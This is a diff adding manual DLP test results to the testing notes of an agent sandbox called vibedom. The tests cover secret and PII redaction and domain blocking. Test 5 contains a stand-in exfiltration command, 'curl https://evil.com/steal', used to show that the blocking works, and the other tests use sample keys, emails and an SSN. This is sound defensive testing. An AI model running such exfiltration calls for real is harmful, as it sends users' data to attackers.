@@ -132,6 +132,92 @@ git clone https://github.com/...   # ✅ Works
 
 **Conclusion:** HTTPS support fully functional for all common development workflows. HTTP/1.1 limitation is minor and doesn't affect typical usage.
 
+## DLP Scrubbing
+
+### Manual Test Results (2026-02-15)
+
+**Environment:**
+- Platform: macOS (Apple Silicon)
+- Docker: Desktop
+- VM Image: vibedom-alpine:latest
+- Proxy: Explicit mode (HTTP_PROXY/HTTPS_PROXY)
+- Test target: httpbin.org (temporarily added to whitelist)
+
+**Setup:**
+- Created test workspace (`~/test-dlp-vibedom`) with `app.py`
+- Started vibedom sandbox (`vibedom run ~/test-dlp-vibedom`)
+- Verified DLP files present in container: `dlp_scrubber.py`, `gitleaks.toml`, `mitmproxy_addon.py`
+
+**Test Results:**
+
+- PASS **Test 1: Secret Scrubbing (Stripe API key in POST body)**
+  - Input: `key=sk_test_4eC39HqLyjWDarjtT1zdp7dc` (form-encoded)
+  - Result: httpbin echoed `key=[REDACTED_STRIPE_API_KEY]`
+  - Audit log: `{"pattern": "stripe-api-key", "category": "SECRET", "original": "sk_test_4eC39HqLyjWDarjtT1zdp7dc", "replaced_with": "[REDACTED_STRIPE_API_KEY]"}`
+
+- PASS **Test 2: Email Scrubbing (PII in JSON body)**
+  - Input: `{"email":"secret@company.com","msg":"hello"}`
+  - Result: httpbin echoed `{"email":"[REDACTED_EMAIL]","msg":"hello"}`
+  - Audit log: `{"pattern": "email", "category": "PII", "original": "secret@company.com", "replaced_with": "[REDACTED_EMAIL]"}`
+
+- PASS **Test 3: Clean Content Passes Through**
+  - Input: `message=hello+world`
+  - Result: httpbin echoed `message: hello world` (unchanged)
+  - Audit log: No "scrubbed" field present (correct)
+
+- PASS **Test 4: Binary Content-Type Skips Request Scrubbing**
+  - Input: `key=sk_test_4eC39HqLyjWDarjtT1zdp7dc` with `Content-Type: application/octet-stream`
+  - Result: Request body NOT scrubbed (audit log has no "scrubbed" field)
+  - Note: httpbin response (`application/json`) was scrubbed by response scrubber, showing `[REDACTED_STRIPE_API_KEY]` in echoed data. This is correct defense-in-depth behavior -- even if request scrubbing is skipped for binary content, response scrubbing catches secrets in text-based responses.
+
+- PASS **Test 5: Non-Whitelisted Domain Blocked**
+  - Input: `curl https://evil.com/steal`
+  - Result: `Domain not whitelisted by vibedom` (403)
+  - Audit log: `{"allowed": false}`
+
+- PASS **Test 6: Multiple Secrets and PII in One Request**
+  - Input: `{"api_key":"sk_test_4eC39HqLyjWDarjtT1zdp7dc","email":"ceo@internal.corp","ssn":"123-45-6789"}`
+  - Result: All sensitive values scrubbed:
+    - Stripe key replaced with `[REDACTED_STRIPE_API_KEY]`
+    - Email replaced with `[REDACTED_EMAIL]`
+    - SSN replaced with `[REDACTED_US_SSN]`
+  - Audit log: 4 findings logged (generic-api-key, stripe-api-key, email, us_ssn)
+  - Note: `api_key` in JSON key name also matched generic-api-key pattern (false positive on key name, not value). This is a known characteristic of regex-based detection.
+
+- PASS **Test 7: Authorization Header Scrubbing**
+  - Input: `Authorization: Bearer sk_test_4eC39HqLyjWDarjtT1zdp7dc`
+  - Result: httpbin echoed `Authorization: Bearer [REDACTED_STRIPE_API_KEY]`
+  - Audit log: `{"pattern": "stripe-api-key", "category": "SECRET", "replaced_with": "[REDACTED_STRIPE_API_KEY]"}`
+
+**Audit Log Verification:**
+
+All 8 requests (7 tests + 1 verbose retry) logged to `/var/log/vibedom/network.jsonl`:
+- Scrubbed requests include `"scrubbed"` array with pattern ID, category, original text, and placeholder
+- Clean requests have no `"scrubbed"` field
+- Blocked requests show `"allowed": false`
+- All entries include method, URL, host, and allowed status
+
+**Summary:**
+
+| Test | Category | Result |
+|------|----------|--------|
+| Secret scrubbing (Stripe key) | SECRET | PASS |
+| Email scrubbing | PII | PASS |
+| Clean content passthrough | N/A | PASS |
+| Binary content skip | Content-Type check | PASS |
+| Domain blocking | Whitelist | PASS |
+| Multiple secrets/PII | Mixed | PASS |
+| Header scrubbing | SECRET | PASS |
+
+**7/7 tests passing (100%)**
+
+**Observations:**
+1. DLP scrubbing works end-to-end over HTTPS with explicit proxy mode
+2. Defense-in-depth: response scrubber catches secrets even when request scrubbing is skipped (binary content)
+3. Audit logging is comprehensive with full finding details
+4. Agent workflow is not interrupted -- requests succeed with scrubbed content
+5. Minor false positive: generic-api-key pattern matches JSON key names containing "api_key" (acceptable trade-off for security)
+
 ## Git Bundle Workflow Testing
 
 **Manual Test Results (2026-02-14):**
